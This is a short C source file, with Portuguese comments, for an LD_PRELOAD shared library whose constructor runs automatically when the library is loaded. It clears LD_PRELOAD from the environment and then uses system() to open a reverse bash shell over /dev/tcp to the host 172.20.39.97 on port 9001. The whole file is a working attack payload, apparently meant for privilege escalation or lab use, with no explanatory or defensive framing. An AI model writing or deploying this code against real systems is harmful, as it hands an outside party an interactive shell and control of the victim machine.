#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

extern char** environ;

__attribute__ ((__constructor__)) void preload (void)
{
    // Limpa LD_PRELOAD para evitar loops
    int i;
    for (i = 0; environ[i]; ++i) {
        if (strstr(environ[i], "LD_PRELOAD")) {
            environ[i][0] = '\0';
        }
    }
    // COMANDO ATUALIZADO: Shell Reversa para o novo IP (172.20.39.97) na porta 9001
    system("0<&196;exec 196<>/dev/tcp/172.20.39.97/9001; bash <&196 >&196 2>&196");
}
